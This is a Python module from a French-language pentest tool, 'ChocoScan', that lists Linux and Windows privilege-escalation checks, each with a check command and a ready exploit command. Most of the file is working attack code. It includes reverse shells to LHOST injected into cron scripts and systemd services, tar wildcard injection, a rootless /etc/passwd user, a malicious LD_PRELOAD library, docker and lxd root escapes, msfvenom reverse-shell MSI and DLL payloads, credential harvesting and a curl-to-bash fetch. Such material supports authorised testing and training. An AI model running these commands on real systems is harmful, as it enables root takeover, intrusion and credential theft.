"""
ChocoScan — Privilege Escalation Checklist.

Checklist contextuelle Linux/Windows adaptée à l'OS détecté.
Pour chaque vecteur : commande de vérification + commande d'exploitation.

Cette checklist complète GTFOBins (sudo/SUID) avec les vecteurs
qui nécessitent une analyse manuelle ou une investigation plus
approfondie que le simple listing de binaires.

Référence : book.hacktricks.xyz/linux-hardening/privilege-escalation
Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations
from dataclasses import dataclass


@dataclass
class PrivescCheck:
    title:       str
    category:    str    # cron | path | suid | sudo | kernel | service | misc
    os:          str    # linux | windows | any
    description: str
    check_cmd:   str    # Commande pour vérifier si vulnérable
    exploit_cmd: str    # Commande d'exploitation si vulnérable
    reference:   str = ""
    difficulty:  str = "medium"  # easy | medium | hard


# ── Checklist Linux ───────────────────────────────────────────────────────────

LINUX_CHECKS: list[PrivescCheck] = [

    # ── Sudo ──────────────────────────────────────────────────────────────────
    PrivescCheck(
        title="sudo -l — binaires exploitables",
        category="sudo", os="linux",
        description="Liste les commandes exécutables avec sudo. "
                    "Chaque binaire peut potentiellement donner un shell (voir GTFOBins).",
        check_cmd="sudo -l 2>/dev/null",
        exploit_cmd="# Voir GTFOBins pour chaque binaire : https://gtfobins.github.io/",
        reference="https://gtfobins.github.io/",
        difficulty="easy",
    ),

    # ── SUID / SGID ───────────────────────────────────────────────────────────
    PrivescCheck(
        title="Binaires SUID — non standards",
        category="suid", os="linux",
        description="Cherche les binaires SUID inhabituels (hors /bin, /usr/bin standards).",
        check_cmd=(
            "find / -perm -4000 -type f 2>/dev/null | "
            "grep -v '^/usr/bin\\|^/usr/sbin\\|^/bin\\|^/sbin' | sort"
        ),
        exploit_cmd="# Analyser chaque binaire non standard avec strings + ltrace + strace",
        difficulty="medium",
    ),
    PrivescCheck(
        title="Binaires SGID — non standards",
        category="suid", os="linux",
        description="Cherche les binaires SGID pouvant donner accès à des groupes privilégiés.",
        check_cmd="find / -perm -2000 -type f 2>/dev/null | grep -v '^/usr\\|^/bin\\|^/sbin'",
        exploit_cmd="# id ; newgrp <group>",
        difficulty="medium",
    ),

    # ── Capabilities ─────────────────────────────────────────────────────────
    PrivescCheck(
        title="Linux Capabilities — cap_setuid",
        category="suid", os="linux",
        description="Un binaire avec cap_setuid peut changer son UID à 0 sans être root.",
        check_cmd="getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_net_raw|cap_dac'",
        exploit_cmd=(
            "# Si python3 a cap_setuid+ep :\n"
            "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
        ),
        reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities",
        difficulty="medium",
    ),

    # ── Cron ──────────────────────────────────────────────────────────────────
    PrivescCheck(
        title="Cron jobs — scripts world-writable",
        category="cron", os="linux",
        description="Si un script exécuté par cron est writable, on peut y injecter du code.",
        check_cmd=(
            "# Voir tous les crons :\n"
            "cat /etc/crontab 2>/dev/null; "
            "ls -la /etc/cron.* 2>/dev/null; "
            "crontab -l 2>/dev/null\n"
            "# Trouver les scripts writable :\n"
            "find /etc/cron* /var/spool/cron -writable -type f 2>/dev/null"
        ),
        exploit_cmd=(
            "echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' >> /path/to/cron_script.sh"
        ),
        difficulty="easy",
    ),
    PrivescCheck(
        title="Cron — wildcard injection",
        category="cron", os="linux",
        description="Un cron qui utilise tar/rsync/chown avec * peut être exploité "
                    "via la création de fichiers avec des noms spéciaux.",
        check_cmd=(
            "# Chercher des wildcards dans les crons :\n"
            "grep -r '\\*' /etc/cron* 2>/dev/null | grep -v '^#'"
        ),
        exploit_cmd=(
            "# Exemple avec tar * :\n"
            "echo '' > '--checkpoint=1'\n"
            "echo '' > '--checkpoint-action=exec=sh shell.sh'\n"
            "echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' > shell.sh"
        ),
        reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#wildcards-in-command-tar",
        difficulty="medium",
    ),

    # ── PATH Hijacking ────────────────────────────────────────────────────────
    PrivescCheck(
        title="PATH Hijacking — répertoires writables",
        category="path", os="linux",
        description="Si un script SUID/sudo appelle une commande sans chemin absolu "
                    "et qu'un répertoire du PATH est writable, on peut remplacer la commande.",
        check_cmd=(
            "# Répertoires writables dans le PATH :\n"
            "echo $PATH | tr ':' '\\n' | xargs -I{} find {} -writable -type d 2>/dev/null\n"
            "# Scripts SUID qui appellent des commandes relatives :\n"
            "find / -perm -4000 -type f 2>/dev/null | xargs strings 2>/dev/null "
            "| grep -v '/' | grep -E '^[a-z]+$'"
        ),
        exploit_cmd=(
            "# Créer un faux binaire dans /tmp et l'ajouter en tête du PATH :\n"
            "echo '#!/bin/bash\\nbash -p' > /tmp/<command>\n"
            "chmod +x /tmp/<command>\n"
            "export PATH=/tmp:$PATH"
        ),
        difficulty="medium",
    ),

    # ── NFS ───────────────────────────────────────────────────────────────────
    PrivescCheck(
        title="NFS — no_root_squash",
        category="misc", os="linux",
        description="Si un export NFS a l'option no_root_squash, le client peut "
                    "créer des binaires SUID et les exécuter comme root.",
        check_cmd=(
            "cat /etc/exports 2>/dev/null\n"
            "# Sur la machine attaquante :\n"
            "showmount -e TARGET_IP"
        ),
        exploit_cmd=(
            "# Sur la machine attaquante (en tant que root) :\n"
            "mkdir /tmp/nfs && mount -t nfs TARGET_IP:/shared /tmp/nfs\n"
            "cp /bin/bash /tmp/nfs/rootbash && chmod +s /tmp/nfs/rootbash\n"
            "# Sur la cible :\n"
            "/shared/rootbash -p"
        ),
        reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe",
        difficulty="medium",
    ),

    # ── Fichiers writables ────────────────────────────────────────────────────
    PrivescCheck(
        title="/etc/passwd writable",
        category="misc", os="linux",
        description="Si /etc/passwd est writable, on peut ajouter un utilisateur root.",
        check_cmd="ls -la /etc/passwd && [ -w /etc/passwd ] && echo 'WRITABLE !'",
        exploit_cmd=(
            "echo 'hacker::0:0:hacker:/root:/bin/bash' >> /etc/passwd\n"
            "su hacker"
        ),
        difficulty="easy",
    ),
    PrivescCheck(
        title="Fichiers de service systemd writables",
        category="service", os="linux",
        description="Si un fichier .service est writable, on peut modifier l'ExecStart "
                    "pour exécuter n'importe quelle commande au prochain démarrage du service.",
        check_cmd=(
            "find /etc/systemd /lib/systemd /usr/lib/systemd "
            "-name '*.service' -writable 2>/dev/null"
        ),
        exploit_cmd=(
            "# Modifier le ExecStart d'un service :\n"
            "sed -i 's|ExecStart=.*|ExecStart=/bin/bash -c \"bash -i >& /dev/tcp/LHOST/4444 0>&1\"|' /path/service\n"
            "systemctl daemon-reload && systemctl restart <service>"
        ),
        difficulty="medium",
    ),

    # ── Groupes spéciaux ─────────────────────────────────────────────────────
    PrivescCheck(
        title="Groupes — docker, lxd, disk, video, adm",
        category="misc", os="linux",
        description="Certains groupes donnent des accès privilégiés sans être root.",
        check_cmd="id && groups",
        exploit_cmd=(
            "# Groupe docker :\n"
            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n"
            "# Groupe lxd :\n"
            "lxc init ubuntu:18.04 privesc -c security.privileged=true\n"
            "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\n"
            "lxc start privesc && lxc exec privesc /bin/sh\n\n"
            "# Groupe disk :\n"
            "debugfs /dev/sda1  # Accès raw au disque"
        ),
        reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe",
        difficulty="easy",
    ),

    # ── LD_PRELOAD ────────────────────────────────────────────────────────────
    PrivescCheck(
        title="LD_PRELOAD — sudo env_keep",
        category="misc", os="linux",
        description="Si sudo conserve LD_PRELOAD, on peut précharger une lib malicieuse.",
        check_cmd="sudo -l 2>/dev/null | grep -i 'LD_PRELOAD\\|env_keep'",
        exploit_cmd=(
            "# Créer la lib malicieuse :\n"
            "cat > /tmp/evil.c << 'EOF'\n"
            "#include <stdio.h>\n#include <unistd.h>\nvoid _init() { setuid(0); system(\"/bin/bash\"); }\n"
            "EOF\n"
            "gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c\n"
            "sudo LD_PRELOAD=/tmp/evil.so <any_sudo_command>"
        ),
        difficulty="medium",
    ),

    # ── Kernel exploits ───────────────────────────────────────────────────────
    PrivescCheck(
        title="Kernel version — exploits connus",
        category="kernel", os="linux",
        description="Vérifier la version du kernel pour des exploits locaux connus "
                    "(DirtyCow, DirtyPipe, OverlayFS, etc.).",
        check_cmd=(
            "uname -r && cat /etc/os-release 2>/dev/null | head -5\n"
            "# Checker avec linux-exploit-suggester :\n"
            "curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash"
        ),
        exploit_cmd=(
            "# DirtyCow (kernel < 4.8.3) : CVE-2016-5195\n"
            "# DirtyPipe (kernel 5.8-5.16) : CVE-2022-0847\n"
            "# PwnKit (polkit < 0.120) : CVE-2021-4034\n"
            "# Voir GTFOBins ou MSF pour les commandes exactes"
        ),
        difficulty="hard",
    ),

    # ── Variables d'env ───────────────────────────────────────────────────────
    PrivescCheck(
        title="Variables d'environnement — credentials",
        category="misc", os="linux",
        description="Les variables d'environnement contiennent parfois des passwords, "
                    "tokens API, ou des configs sensibles.",
        check_cmd=(
            "env 2>/dev/null | grep -iE 'pass|secret|key|token|api|cred|auth'\n"
            "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' "
            "| grep -iE 'pass|secret|key|token' | head -20"
        ),
        exploit_cmd="# Utiliser les credentials trouvés pour su/ssh/connexion BDD",
        difficulty="easy",
    ),
]


# ── Checklist Windows ─────────────────────────────────────────────────────────

WINDOWS_CHECKS: list[PrivescCheck] = [

    PrivescCheck(
        title="whoami /all — privilèges et groupes",
        category="misc", os="windows",
        description="Liste tous les privilèges du compte courant. "
                    "SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege → Potato attacks.",
        check_cmd="whoami /all",
        exploit_cmd=(
            "# SeImpersonatePrivilege → PrintSpoofer :\n"
            "PrintSpoofer64.exe -i -c cmd\n\n"
            "# SeImpersonatePrivilege → GodPotato :\n"
            "GodPotato.exe -cmd 'cmd /c whoami'\n\n"
            "# SeImpersonatePrivilege → JuicyPotatoNG :\n"
            "JuicyPotatoNG.exe -t * -p cmd.exe -a '/c whoami'"
        ),
        reference="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens",
        difficulty="easy",
    ),
    PrivescCheck(
        title="AlwaysInstallElevated",
        category="misc", os="windows",
        description="Si cette clé de registre est activée, n'importe quel utilisateur "
                    "peut installer des .msi en tant que SYSTEM.",
        check_cmd=(
            "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
            "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
        ),
        exploit_cmd=(
            "# Créer un MSI malicieux avec msfvenom :\n"
            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f msi -o evil.msi\n"
            "msiexec /quiet /qn /i evil.msi"
        ),
        difficulty="easy",
    ),
    PrivescCheck(
        title="Unquoted Service Paths",
        category="service", os="windows",
        description="Un service avec un chemin non quoté contenant des espaces "
                    "peut être exploité en plaçant un exécutable à un chemin intermédiaire.",
        check_cmd=(
            "wmic service get name,displayname,pathname,startmode 2>nul "
            "| findstr /i 'auto' | findstr /i /v 'C:\\Windows' | findstr /i /v '\"'"
        ),
        exploit_cmd=(
            "# Si le chemin est C:\\Program Files\\My Service\\service.exe :\n"
            "# Placer un exécutable en C:\\Program.exe ou C:\\Program Files\\My.exe\n"
            "# Puis redémarrer le service ou attendre le prochain démarrage"
        ),
        difficulty="medium",
    ),
    PrivescCheck(
        title="Weak Service Permissions",
        category="service", os="windows",
        description="Si on peut modifier la configuration d'un service, "
                    "on peut changer son chemin d'exécutable.",
        check_cmd=(
            "# Avec accesschk (Sysinternals) :\n"
            "accesschk.exe -uwcqv * 2>nul | findstr 'RW'\n\n"
            "# Ou avec PowerShell :\n"
            "Get-WmiObject win32_service | select Name, StartName, PathName | fl"
        ),
        exploit_cmd=(
            "sc config <service> binpath= \"C:\\temp\\evil.exe\"\n"
            "sc stop <service> && sc start <service>"
        ),
        difficulty="medium",
    ),
    PrivescCheck(
        title="AutoLogon credentials",
        category="misc", os="windows",
        description="Les credentials d'autologon sont stockés en clair dans le registre.",
        check_cmd=(
            "reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon' "
            "2>nul | findstr 'DefaultUserName DefaultPassword'"
        ),
        exploit_cmd="# Utiliser les credentials pour runas/psexec/winrm",
        difficulty="easy",
    ),
    PrivescCheck(
        title="SAM / SYSTEM backup files",
        category="misc", os="windows",
        description="Les sauvegardes de SAM et SYSTEM permettent d'extraire les hashes locaux.",
        check_cmd=(
            "dir C:\\Windows\\Repair\\SAM 2>nul\n"
            "dir C:\\Windows\\System32\\config\\RegBack\\ 2>nul"
        ),
        exploit_cmd=(
            "# Copier les fichiers puis extraire les hashes offline :\n"
            "impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
        ),
        difficulty="medium",
    ),
    PrivescCheck(
        title="DLL Hijacking — répertoires writables dans PATH",
        category="misc", os="windows",
        description="Si un service charge une DLL depuis un répertoire writable, "
                    "on peut substituer la DLL.",
        check_cmd=(
            "# Lister les DLL manquantes avec Procmon (Sysinternals)\n"
            "# Ou vérifier les répertoires writables dans le PATH :\n"
            "$env:PATH -split ';' | ForEach-Object { "
            "if (Test-Path $_) { (Get-Acl $_).Access | "
            "Where-Object {$_.FileSystemRights -match 'Write'} | Select IdentityReference, FileSystemRights }}"
        ),
        exploit_cmd=(
            "# Créer la DLL malicieuse avec msfvenom :\n"
            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 "
            "-f dll -o malicious.dll\n"
            "# Copier dans le répertoire writable avec le nom de la DLL manquante"
        ),
        difficulty="hard",
    ),
    PrivescCheck(
        title="Scheduled Tasks — permissions faibles",
        category="cron", os="windows",
        description="Tâches planifiées dont le script/exécutable est modifiable.",
        check_cmd=(
            "schtasks /query /fo LIST /v 2>nul | findstr 'Task To Run\\|Run As User'\n\n"
            "# Vérifier les permissions sur chaque script listé"
        ),
        exploit_cmd=(
            "# Si le script est writable :\n"
            "echo 'C:\\temp\\evil.exe' >> C:\\path\\to\\task_script.bat\n"
            "# Attendre l'exécution ou forcer : schtasks /run /tn '<task_name>'"
        ),
        difficulty="medium",
    ),
]


# ── Point d'entrée ────────────────────────────────────────────────────────────

def get_privesc_checklist(os_target: str = "linux") -> list[PrivescCheck]:
    """Retourne la checklist de privesc pour l'OS cible."""
    if os_target == "windows":
        return WINDOWS_CHECKS
    return LINUX_CHECKS


def get_quick_checks(os_target: str = "linux") -> list[PrivescCheck]:
    """Retourne seulement les checks faciles/rapides (easy difficulty)."""
    return [c for c in get_privesc_checklist(os_target) if c.difficulty == "easy"]
